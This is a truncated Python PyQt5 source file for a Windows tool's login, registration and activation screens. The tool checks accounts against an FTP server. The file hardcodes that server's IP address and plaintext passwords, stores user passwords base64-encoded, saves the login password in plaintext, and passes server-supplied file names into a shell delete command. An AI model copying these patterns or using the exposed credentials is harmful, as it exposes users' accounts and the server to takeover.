# coding:utf-8
from __future__ import print_function
import telnetlib, winreg, time, linecache, requests, json, threading
import sys, os, time
if hasattr(sys, 'frozen'):
    os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']
import time, requests
from PyQt5.QtWidgets import QMessageBox
from PyQt5.QtCore import *
from PyQt5 import QtCore
from PyQt5 import QtGui
import threading, subprocess
import winreg, shutil, psutil,linecache, base64
from tkinter import messagebox
import tkinter.messagebox
from tkinter import *
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QFileDialog
class CustomMsg(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
    def init_ui(self):
        self.setFixedSize(412,234)
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.setWindowFlags(Qt.FramelessWindowHint)  # 去边框
        self.setAttribute(Qt.WA_TranslucentBackground)  # 设置窗口背景透明
        self.label = QtWidgets.QLabel(self)
        self.label.setGeometry(QtCore.QRect(-10, 0, 431, 241))
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap("res/bejing.png"))
        self.label.setScaledContents(True)
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self)
        self.label_2.setGeometry(QtCore.QRect(50, 20, 72, 15))
        self.label_2.setStyleSheet("font-family:微软雅黑;\n"
        "color:white;")
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self)
        self.label_3.setGeometry(QtCore.QRect(60, 60, 301, 101))
        self.label_3.setStyleSheet("font-family:微软雅黑;\n"
        "color:white;")
        self.label_3.setText("")
        self.label_3.setAlignment(QtCore.Qt.AlignLeading|QtCore.Qt.AlignLeft|QtCore.Qt.AlignTop)
        self.label_3.setObjectName("label_3")
        self.pushButton_3 = QtWidgets.QPushButton(self)
        self.pushButton_3.setGeometry(QtCore.QRect(240, 180, 131, 31))
        self.pushButton_3.setStyleSheet("QPushButton{\n"
        "    background:#6C6C6C;\n"
        "    color:white;\n"
        "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
        "}\n"
        "QPushButton:hover{                    \n"
        "    background:#9D9D9D;\n"
        "}\n"
        "QPushButton:pressed{\n"
        "    border: 1px solid #3C3C3C!important;\n"
        "}")
        self.pushButton_3.setObjectName("pushButton_3")

        self.retranslateUi(self)
        QtCore.QMetaObject.connectSlotsByName(self)
    def retranslateUi(self, Form):
        customtext = open("Customtext.ini", "r")
        text = customtext.read()
        customtext.close()
        self.label_3.setText(text)
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label_2.setText(_translate("Form", "提示"))
        self.pushButton_3.setText(_translate("Form", "确定"))
        self.pushButton_3.clicked.connect(self.sure)
    def sure(self):
        self.close()
    def mousePressEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = True
            self.m_DragPosition = e.globalPos() - self.pos()
            e.accept()
    def mouseReleaseEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = False
    def mouseMoveEvent(self, e):
        try:
            if Qt.LeftButton and self.m_drag:
                self.move(e.globalPos() - self.m_DragPosition)
                e.accept()
        except:
            pass
class Login(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
    def init_ui(self):
        self.setFixedSize(405,550)
        self.setWindowFlags(Qt.FramelessWindowHint)  # 去边框
        self.setAttribute(Qt.WA_TranslucentBackground)  # 设置窗口背景透明
        self.label_logs_bk = QtWidgets.QLabel(self)
        self.label_logs_bk.setGeometry(QtCore.QRect(0, 0, 401, 561))
        self.label_logs_bk.setText("")
        self.label_logs_bk.setPixmap(QtGui.QPixmap("res\\bejing.png"))
        self.label_logs_bk.setScaledContents(True)
        self.label_logs_bk.setObjectName("label_logs_bk")
        self.tabWidget = QtWidgets.QTabWidget(self)
        self.tabWidget.setGeometry(QtCore.QRect(50, 40, 301, 451))
        self.tabWidget.setAutoFillBackground(False)
        self.tabWidget.setStyleSheet("QTabWidget::pane{\n"
                                     "min-width:70px;\n"
                                     "min-height:25px;\n"
                                     "\n"
                                     "border-top: 2px solid;\n"
                                     "\n"
                                     "border-color: #f5f5f5;\n"
                                     "\n"
                                     "}\n"
                                     "\n"
                                     "QTabBar::tab {\n"
                                     "\n"
                                     "min-width:70px;\n"
                                     "\n"
                                     "min-height:25px;\n"
                                     "\n"
                                     "color: #333333;\n"
                                     "\n"
                                     "font:17px \"Microsoft YaHei\";\n"
                                     "\n"
                                     "border: 0px solid;\n"
                                     "\n"
                                     "\n"
                                     "\n"
                                     "}\n"
                                     "\n"
                                     "QTabBar::tab:selected{\n"
                                     "\n"
                                     "min-width:70px;\n"
                                     "\n"
                                     "min-height:25px;\n"
                                     "color: #4796f0;\n"
                                     "\n"
                                     "font:17px \"Microsoft YaHei\";\n"
                                     "\n"
                                     "border: 0px solid;\n"
                                     "\n"
                                     "border-bottom: 2px solid;\n"
                                     "\n"
                                     "border-color: #4796f0;\n"
                                     "\n"
                                     "}")
        self.tabWidget.setTabsClosable(False)
        self.tabWidget.setMovable(False)
        self.tabWidget.setTabBarAutoHide(False)
        self.tabWidget.setObjectName("tabWidget")
        self.tab_4 = QtWidgets.QWidget()
        self.tab_4.setObjectName("tab_4")
        self.pushButton = QtWidgets.QPushButton(self.tab_4)
        self.pushButton.setGeometry(QtCore.QRect(45, 260, 211, 31))
        self.pushButton.setStyleSheet("QPushButton{\n"
                                      "color:white;\n"
                                      "background:dodgerblue;\n"
                                      "font-size:16px;\n"
                                      "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 8px;font-family: 微软雅黑;\n"
                                      "                }\n"
                                      "                QPushButton:hover{\n"
                                      "                    background:deepskyblue;\n"
                                      "                }\n"
                                      "                QPushButton:pressed{\n"
                                      "                    border: 1px solid #174ea9!important;\n"
                                      "                    background: #174ea9;\n"
                                      "                }")
        self.pushButton.setObjectName("pushButton")
        self.label_4 = QtWidgets.QLabel(self.tab_4)
        self.label_4.setGeometry(QtCore.QRect(10, 390, 171, 21))
        self.label_4.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:14px;\n"
                                   "color:darkgray;")
        self.label_4.setObjectName("label_4")
        self.label_2 = QtWidgets.QLabel(self.tab_4)
        self.label_2.setGeometry(QtCore.QRect(60, 10, 181, 31))
        self.label_2.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:24px;\n"
                                   "color:white;")
        self.label_2.setObjectName("label_2")
        self.lineEdit = QtWidgets.QLineEdit(self.tab_4)
        self.lineEdit.setGeometry(QtCore.QRect(10, 130, 281, 31))
        self.lineEdit.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit.setText("")
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.tab_4)
        self.lineEdit_2.setGeometry(QtCore.QRect(10, 174, 281, 31))
        self.lineEdit_2.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.label_3 = QtWidgets.QLabel(self.tab_4)
        self.label_3.setGeometry(QtCore.QRect(90, 40, 111, 21))
        self.label_3.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:14px;\n"
                                   "color:darkgray;")
        self.label_3.setObjectName("label_3")
        self.checkBox = QtWidgets.QCheckBox(self.tab_4)
        self.checkBox.setGeometry(QtCore.QRect(197, 210, 93, 19))
        self.checkBox.setStyleSheet("font-family:微软雅黑;\n"
                                    "font-size:14px;\n"
                                    "color:white;")
        self.checkBox.setObjectName("checkBox")
        self.tabWidget.addTab(self.tab_4, "")
        self.tab_5 = QtWidgets.QWidget()
        self.tab_5.setObjectName("tab_5")
        self.groupBox_7 = QtWidgets.QGroupBox(self.tab_5)
        self.groupBox_7.setGeometry(QtCore.QRect(10, 510, 311, 51))
        self.groupBox_7.setTitle("")
        self.groupBox_7.setObjectName("groupBox_7")
        self.pushButton_12 = QtWidgets.QPushButton(self.groupBox_7)
        self.pushButton_12.setGeometry(QtCore.QRect(210, 10, 71, 31))
        self.pushButton_12.setStyleSheet("QPushButton{\n"
                                         "color:white;\n"
                                         "background:dodgerblue;\n"
                                         "font-size:14px;\n"
                                         "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 10px;font-family: 微软雅黑;\n"
                                         "                }\n"
                                         "                QPushButton:hover{\n"
                                         "                    background:deepskyblue;\n"
                                         "                }\n"
                                         "                QPushButton:pressed{\n"
                                         "                    border: 1px solid #174ea9!important;\n"
                                         "                    background: #174ea9;\n"
                                         "                }")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("res/download.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_12.setIcon(icon)
        self.pushButton_12.setObjectName("pushButton_12")
        self.pushButton_13 = QtWidgets.QPushButton(self.groupBox_7)
        self.pushButton_13.setGeometry(QtCore.QRect(120, 10, 71, 31))
        self.pushButton_13.setStyleSheet("QPushButton{\n"
                                         "color:white;\n"
                                         "background:dodgerblue;\n"
                                         "font-size:14px;\n"
                                         "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 10px;font-family: 微软雅黑;\n"
                                         "                }\n"
                                         "                QPushButton:hover{\n"
                                         "                    background:deepskyblue;\n"
                                         "                }\n"
                                         "                QPushButton:pressed{\n"
                                         "                    border: 1px solid #174ea9!important;\n"
                                         "                    background: #174ea9;\n"
                                         "                }")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap("res/refresh.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_13.setIcon(icon1)
        self.pushButton_13.setObjectName("pushButton_13")
        self.pushButton_14 = QtWidgets.QPushButton(self.groupBox_7)
        self.pushButton_14.setGeometry(QtCore.QRect(30, 10, 71, 31))
        self.pushButton_14.setStyleSheet("QPushButton{\n"
                                         "color:white;\n"
                                         "background:dodgerblue;\n"
                                         "font-size:14px;\n"
                                         "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 10px;font-family: 微软雅黑;\n"
                                         "                }\n"
                                         "                QPushButton:hover{\n"
                                         "                    background:deepskyblue;\n"
                                         "                }\n"
                                         "                QPushButton:pressed{\n"
                                         "                    border: 1px solid #174ea9!important;\n"
                                         "                    background: #174ea9;\n"
                                         "                }")
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap("res/rubish.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_14.setIcon(icon2)
        self.pushButton_14.setObjectName("pushButton_14")
        self.label_5 = QtWidgets.QLabel(self.tab_5)
        self.label_5.setGeometry(QtCore.QRect(60, 10, 181, 31))
        self.label_5.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:24px;\n"
                                   "color:white;")
        self.label_5.setObjectName("label_5")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit_3.setGeometry(QtCore.QRect(10, 174, 281, 31))
        self.lineEdit_3.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.lineEdit_4 = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit_4.setGeometry(QtCore.QRect(10, 130, 281, 31))
        self.lineEdit_4.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit_4.setText("")
        self.lineEdit_4.setObjectName("lineEdit_4")
        self.pushButton_3 = QtWidgets.QPushButton(self.tab_5)
        self.pushButton_3.setGeometry(QtCore.QRect(45, 260, 211, 31))
        self.pushButton_3.setStyleSheet("QPushButton{\n"
                                        "color:white;\n"
                                        "background:dodgerblue;\n"
                                        "font-size:16px;\n"
                                        "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 8px;font-family: 微软雅黑;\n"
                                        "                }\n"
                                        "                QPushButton:hover{\n"
                                        "                    background:deepskyblue;\n"
                                        "                }\n"
                                        "                QPushButton:pressed{\n"
                                        "                    border: 1px solid #174ea9!important;\n"
                                        "                    background: #174ea9;\n"
                                        "                }")
        self.pushButton_3.setObjectName("pushButton_3")
        self.label_6 = QtWidgets.QLabel(self.tab_5)
        self.label_6.setGeometry(QtCore.QRect(10, 390, 171, 21))
        self.label_6.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:14px;\n"
                                   "color:darkgray;")
        self.label_6.setObjectName("label_6")
        self.label_7 = QtWidgets.QLabel(self.tab_5)
        self.label_7.setGeometry(QtCore.QRect(90, 40, 111, 21))
        self.label_7.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:14px;\n"
                                   "color:darkgray;")
        self.label_7.setObjectName("label_7")
        self.tabWidget.addTab(self.tab_5, "")
        self.tab_6 = QtWidgets.QWidget()
        self.tab_6.setObjectName("tab_6")
        self.lineEdit_5 = QtWidgets.QLineEdit(self.tab_6)
        self.lineEdit_5.setGeometry(QtCore.QRect(10, 174, 281, 31))
        self.lineEdit_5.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit_5.setObjectName("lineEdit_5")
        self.label_8 = QtWidgets.QLabel(self.tab_6)
        self.label_8.setGeometry(QtCore.QRect(60, 10, 181, 31))
        self.label_8.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:24px;\n"
                                   "color:white;")
        self.label_8.setObjectName("label_8")
        self.lineEdit_6 = QtWidgets.QLineEdit(self.tab_6)
        self.lineEdit_6.setGeometry(QtCore.QRect(10, 130, 281, 31))
        self.lineEdit_6.setStyleSheet("font-family:微软雅黑;")
        self.lineEdit_6.setText("")
        self.lineEdit_6.setObjectName("lineEdit_6")
        self.pushButton_4 = QtWidgets.QPushButton(self.tab_6)
        self.pushButton_4.setGeometry(QtCore.QRect(45, 260, 211, 31))
        self.pushButton_4.setStyleSheet("QPushButton{\n"
                                        "color:white;\n"
                                        "background:dodgerblue;\n"
                                        "font-size:16px;\n"
                                        "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 8px;font-family: 微软雅黑;\n"
                                        "                }\n"
                                        "                QPushButton:hover{\n"
                                        "                    background:deepskyblue;\n"
                                        "                }\n"
                                        "                QPushButton:pressed{\n"
                                        "                    border: 1px solid #174ea9!important;\n"
                                        "                    background: #174ea9;\n"
                                        "                }")
        self.pushButton_4.setObjectName("pushButton_4")
        self.label_9 = QtWidgets.QLabel(self.tab_6)
        self.label_9.setGeometry(QtCore.QRect(90, 40, 111, 21))
        self.label_9.setStyleSheet("font-family:微软雅黑;\n"
                                   "font-size:14px;\n"
                                   "color:darkgray;")
        self.label_9.setObjectName("label_9")
        self.label_10 = QtWidgets.QLabel(self.tab_6)
        self.label_10.setGeometry(QtCore.QRect(10, 390, 171, 21))
        self.label_10.setStyleSheet("font-family:微软雅黑;\n"
                                    "font-size:14px;\n"
                                    "color:darkgray;")
        self.label_10.setObjectName("label_10")
        self.tabWidget.addTab(self.tab_6, "")
        self.pushButton_exit = QtWidgets.QPushButton(self)
        self.pushButton_exit.setGeometry(QtCore.QRect(330, 40, 21, 21))
        self.pushButton_exit.setStyleSheet("QPushButton{\n"
                                           "                                                             color:white;\n"
                                           "                                                             background:red;\n"
                                           "                                                             font-size:18px;\n"
                                           "                                                             box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:18px;border-radius: 10px;font-family: 微软雅黑;\n"
                                           "                                                         }\n"
                                           "                                                         QPushButton:hover{\n"
                                           "                                                             background:OrangeRed;\n"
                                           "                                                         }\n"
                                           "                                                         QPushButton:pressed{\n"
                                           "                                                             \n"
                                           "                                                             background: FireBrick;\\n\n"
                                           "                                                         }")
        self.pushButton_exit.setText("")
        self.pushButton_exit.setObjectName("pushButton_exit")
        self.pushButton_mini = QtWidgets.QPushButton(self)
        self.pushButton_mini.setGeometry(QtCore.QRect(300, 40, 21, 21))
        self.pushButton_mini.setStyleSheet("QPushButton{\n"
                                           "                                                             color:white;\n"
                                           "                                                             background:gray;\n"
                                           "                                                             font-size:18px;\n"
                                           "                                                             box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:18px;border-radius: 10px;font-family: 微软雅黑;\n"
                                           "                                                         }\n"
                                           "                                                         QPushButton:hover{\n"
                                           "                                                             background:#9D9D9D;\n"
                                           "                                                         }\n"
                                           "                                                         QPushButton:pressed{\n"
                                           "                                                            \n"
                                           "                                                             background: #4F4F4F;\\n\n"
                                           "                                                         }")
        self.pushButton_mini.setText("")
        self.pushButton_mini.setObjectName("pushButton_mini")
        self.retranslateUi(self)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(self)
    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.pushButton.setText(_translate("Form", "登陆软件"))
        self.label_4.setText(_translate("Form", "Breath Checker"))
        self.label_2.setText(_translate("Form", "Breath Checker"))
        self.label_3.setText(_translate("Form", "Thanks for using"))
        self.checkBox.setText(_translate("Form", "记住密码"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate("Form", "登录"))
        self.pushButton_12.setText(_translate("Form", "添加"))
        self.pushButton_13.setText(_translate("Form", "刷新"))
        self.pushButton_14.setText(_translate("Form", "删除"))
        self.label_5.setText(_translate("Form", "Breath Checker"))
        self.pushButton_3.setText(_translate("Form", "注册"))
        self.label_6.setText(_translate("Form", "Breath Checker"))
        self.label_7.setText(_translate("Form", "Thanks for using"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), _translate("Form", "注册"))
        self.label_8.setText(_translate("Form", "Breath Checker"))
        self.pushButton_4.setText(_translate("Form", "激活账号"))
        self.label_9.setText(_translate("Form", "Thanks for using"))
        self.label_10.setText(_translate("Form", "Breath Checker"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_6), _translate("Form", "激活"))
        self.lineEdit_2.setEchoMode(QtWidgets.QLineEdit.Password)
        self.lineEdit_3.setEchoMode(QtWidgets.QLineEdit.Password)
        self.lineEdit.setPlaceholderText("请输入账号")
        self.lineEdit_2.setPlaceholderText("请输入密码")
        self.lineEdit_3.setPlaceholderText("请输入注册密码")
        self.lineEdit_4.setPlaceholderText("请输入注册账号")
        self.lineEdit_5.setPlaceholderText("请输入激活码")
        self.lineEdit_6.setPlaceholderText("要激活的账号")
        self.pushButton.clicked.connect(self.Login)
        self.pushButton_3.clicked.connect(self.Register)
        self.pushButton_4.clicked.connect(self.Activation)
        self.pushButton_exit.clicked.connect(self.exit)
        self.pushButton_mini.clicked.connect(self.mini)
        if os.path.exists("remember.ini"):
            try:
                self.checkBox.setChecked(True)
                file = linecache.getline("remember.ini", 1)
                self.lineEdit.setText(file.replace("\n", ""))
                file = linecache.getline("remember.ini", 2)
                self.lineEdit_2.setText(file.replace("\n", ""))
            except:
                pass
        def Check():
            while True:
                if self.checkBox.isChecked() == True:
                    file = open("remember.ini", "w")
                    file.write(self.lineEdit.text() + "\n")
                    file.close()
                    file = open("remember.ini", "a")
                    file.write(self.lineEdit_2.text())
                    file.close()
                else:
                    try:
                        os.remove("remember.ini")
                    except:
                        pass
                time.sleep(0.3)
        Thread = threading.Thread(target=Check)
        Thread.start()
    def Login(self):
        BB = requests.get("https://gitee.com/BreathTeam/Launcher/raw/master/Vertion").text
        Ver = ("Ver1.0.0")
        if BB != Ver:
            root = Tk()
            root.withdraw()
            tkinter.messagebox.showinfo('Tip', '发现新版本请到Breath内部下载最新版本工具箱!')
            os._exit(-1)
        else:
            import ftplib
            ftp = ftplib.FTP()
            host = '118.24.242.123'
            userName = 'Breath'
            passWord = 'zzz396396396'
            port = 21
            timeout = 100
            ftp.connect(host, port, timeout)
            ftp.login(userName, passWord)
            ftp.encoding = 'gb18030'
            allFileName = ftp.nlst()
            for lists in allFileName:
                from ftplib import FTP
                ftp_addr = '118.24.242.123'
                f = FTP(ftp_addr)
                f.login("Breath", "zzz396396396")
                f.cwd("/")
                remote_file = lists
                f.retrbinary("RETR %s" % remote_file, open(remote_file, "wb").write)
                file = open(lists, "r")
                import base64
                if self.lineEdit.text() == str(
                        base64.b64decode(lists).decode("utf-8")) and self.lineEdit_2.text() == str(
                        base64.b64decode(file.read()).decode("utf-8")):
                    file.close()
                    subprocess.Popen(r"del /q " + lists, shell=True)
                    import ftplib
                    ftp = ftplib.FTP()
                    host = '118.24.242.123'
                    userName = 'VIP'
                    passWord = 'zzz396396396'
                    port = 21
                    timeout = 100
                    ftp.connect(host, port, timeout)
                    ftp.login(userName, passWord)
                    ftp.encoding = 'gb18030'
                    allFileName = ftp.nlst()
                    for lists in allFileName:
                        text = base64.b64encode(self.lineEdit.text().encode('utf-8'))
                        Acount = str(text, "utf-8")
                        if lists == Acount:
                            self.gui = Check()
                            self.gui.show()
                            self.close()
                            break
                    else:
                        QMessageBox.information(self, "Tip", "该账号还未激活!")
                    break
            else:
                QMessageBox.information(self, "Tip", "账号或密码错误!")
    def Register(self):
        import ftplib
        ftp = ftplib.FTP()
        host = '118.24.242.123'
        userName = 'Breath'
        passWord = 'zzz396396396'
        port = 21
        timeout = 100
        ftp.connect(host, port, timeout)
        ftp.login(userName, passWord)
        ftp.encoding = 'gb18030'
        allFileName = ftp.nlst()
        for lists in allFileName:
            import base64
            text = base64.b64encode(self.lineEdit_4.text().encode('utf-8'))
            Acount = str(text, "utf-8")
            if Acount == lists:
                QMessageBox.information(self, "Tip", "账号太受欢迎已被注册过!")
                break
        else:
            if len(self.lineEdit_4.text()) < 6:
                QMessageBox.information(self, "Tip", "注册账号至少需要六位!")
            else:
                if len(self.lineEdit_3.text()) < 6:
                    QMessageBox.information(self, "Tip", "注册密码至少需要六位!")
                else:
                    import ftplib
                    host = '118.24.242.123'
                    username = 'Breath'
                    password = 'zzz396396396'
                    f = ftplib.FTP(host)
                    f.login(username, password)
                    def ftp_upload(file_name):
                        file_remote = file_name
                        bufsize = 1024
                        fp = open(file_name, 'rb')
                        f.storbinary('STOR ' + file_remote, fp, bufsize)
                        fp.close()
                    import base64
                    text = base64.b64encode(self.lineEdit_4.text().encode('utf-8'))
                    Acount = str(text, "utf-8")
                    text1 = base64.b64encode(self.lineEdit_3.text().encode('utf-8'))
                    psw = str(text1, "utf-8")
                    file = open(Acount, "w")
                    file.write(psw)
                    file.close()
                    text = base64.b64encode(self.lineEdit_4.text().encode('utf-8'))
                    Acount = str(text, "utf-8")
                    ftp_upload(Acount)
                    os.remove(Acount)
                    f.quit()
                    QMessageBox.information(self, "Tip", "注册成功!")
    def Activation(self):
        import ftplib
        ftp = ftplib.FTP()
        host = '118.24.242.123'
        userName = 'CDKEY'
        passWord = 'zzz396396396'
        port = 21
        timeout = 100
        ftp.connect(host, port, timeout)
        ftp.login(userName, passWord)
        ftp.encoding = 'gb18030'
        allFileName = ftp.nlst()
        for lists in allFileName:
            if self.lineEdit_5.text() == lists:
                QMessageBox.information(self, "Tip", "此账号激活成功!")
                ftp.delete(self.lineEdit_5.text())
                import base64
                text = base64.b64encode(self.lineEdit_6.text().encode('utf-8'))
                Acount = str(text, "utf-8")
                file = open(Acount, "w")
                file.close()
                import ftplib
                host = '118.24.242.123'
                username = 'VIP'
                password = 'zzz396396396'
                f = ftplib.FTP(host)
                f.login(username, password)
                def ftp_upload(file_name):
                    file_remote = file_name
                    bufsize = 1024
                    fp = open(file_name, 'rb')
                    f.storbinary('STOR ' + file_remote, fp, bufsize)
                    fp.close()
                ftp_upload(Acount)
                break
        else:
            QMessageBox.information(self, "Tip", "请输入正确的激活码或者此激活码已失效!")
    def exit(self):
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            os._exit(-1)

        Thread = threading.Thread(target=Thread)
        Thread.start()
    def mini(self):
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            self.showMinimized()
            self.setWindowOpacity(1)

        Thread = threading.Thread(target=Thread)
        Thread.start()
    def mousePressEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = True
            self.m_DragPosition = e.globalPos() - self.pos()
            e.accept()
    def mouseReleaseEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = False
    def mouseMoveEvent(self, e):
        try:
            if Qt.LeftButton and self.m_drag:
                self.move(e.globalPos() - self.m_DragPosition)
                e.accept()
        except:
            print("错误代码:000x0")
def CustomMsgBox(target, text):
    file = open("Customtext.ini", "w")
    file.write(text)
    file.close()
    target.gui = CustomMsg()
    target.gui.show()
class Check(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
        import win32api,win32con
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        #self.move(x - 300, y - 300)
    def init_ui(self):
        self.setFixedSize(920, 548)
        self.setStyleSheet("font-family:微软雅黑")
        self.setWindowFlags(Qt.FramelessWindowHint)  # 去边框
        self.setAttribute(Qt.WA_TranslucentBackground)  # 设置窗口背景透明
        self.centralwidget = QtWidgets.QWidget(self)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton_12 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_12.setGeometry(QtCore.QRect(890, 15, 21, 21))
        self.pushButton_12.setStyleSheet("QPushButton{\n"
                                         "    background:#CE0000;\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 10px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:#FF2D2D;\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "    border: 1px solid #3C3C3C!important;\n"
                                         "    background:#AE0000;\n"
                                         "}")
        self.pushButton_12.setText("")
        self.pushButton_12.setObjectName("pushButton_12")
        self.pushButton_11 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_11.setGeometry(QtCore.QRect(850, 15, 21, 21))
        self.pushButton_11.setStyleSheet("QPushButton{\n"
                                         "    background:#6C6C6C;\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 10px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:#9D9D9D;\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "    border: 1px solid #3C3C3C!important;\n"
                                         "}")
        self.pushButton_11.setText("")
        self.pushButton_11.setObjectName("pushButton_11")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(-2, -35, 931, 591))
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.label_33 = QtWidgets.QLabel(self.tab)
        self.label_33.setGeometry(QtCore.QRect(280, 90, 591, 141))
        self.label_33.setText("")
        self.label_33.setPixmap(QtGui.QPixmap("res/gsmw.jpg"))
        self.label_33.setScaledContents(False)
        self.label_33.setObjectName("label_33")
        self.label_34 = QtWidgets.QLabel(self.tab)
        self.label_34.setGeometry(QtCore.QRect(300, 89, 101, 31))
        self.label_34.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_34.setObjectName("label_34")
        self.label_35 = QtWidgets.QLabel(self.tab)
        self.label_35.setEnabled(True)
        self.label_35.setGeometry(QtCore.QRect(300, 129, 541, 101))
        self.label_35.setMouseTracking(True)
        self.label_35.setTabletTracking(False)
        self.label_35.setAcceptDrops(False)
        self.label_35.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_35.setAutoFillBackground(False)
        self.label_35.setInputMethodHints(QtCore.Qt.ImhNone)
        self.label_35.setScaledContents(True)
        self.label_35.setAlignment(QtCore.Qt.AlignLeading | QtCore.Qt.AlignLeft | QtCore.Qt.AlignTop)
        self.label_35.setWordWrap(True)
        self.label_35.setOpenExternalLinks(False)
        self.label_35.setObjectName("label_35")
        self.label_36 = QtWidgets.QLabel(self.tab)
        self.label_36.setGeometry(QtCore.QRect(-2, 0, 931, 561))
        self.label_36.setText("")
        self.label_36.setPixmap(QtGui.QPixmap("res/demo_blur.png"))
        self.label_36.setScaledContents(True)
        self.label_36.setWordWrap(False)
        self.label_36.setObjectName("label_36")
        self.label_37 = QtWidgets.QLabel(self.tab)
        self.label_37.setGeometry(QtCore.QRect(230, 480, 691, 81))
        self.label_37.setText("")
        self.label_37.setPixmap(QtGui.QPixmap("res/Gray.png"))
        self.label_37.setScaledContents(True)
        self.label_37.setObjectName("label_37")
        self.pushButton_33 = QtWidgets.QPushButton(self.tab)
        self.pushButton_33.setGeometry(QtCore.QRect(510, 490, 50, 50))
        self.pushButton_33.setStyleSheet("QPushButton{\n"
                                         "    background:#6C6C6C;\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:24px;border-radius: 24px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:#9D9D9D;\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "    background:gray;\n"
                                         "}")
        self.pushButton_33.setText("")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("res/interface.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_33.setIcon(icon)
        self.pushButton_33.setIconSize(QtCore.QSize(50, 51))
        self.pushButton_33.setObjectName("pushButton_33")
        self.pushButton_34 = QtWidgets.QPushButton(self.tab)
        self.pushButton_34.setGeometry(QtCore.QRect(460, 500, 31, 31))
        self.pushButton_34.setStyleSheet("QPushButton{\n"
                                         "    background:#6C6C6C;\n"
                                         "    color:white;\n"
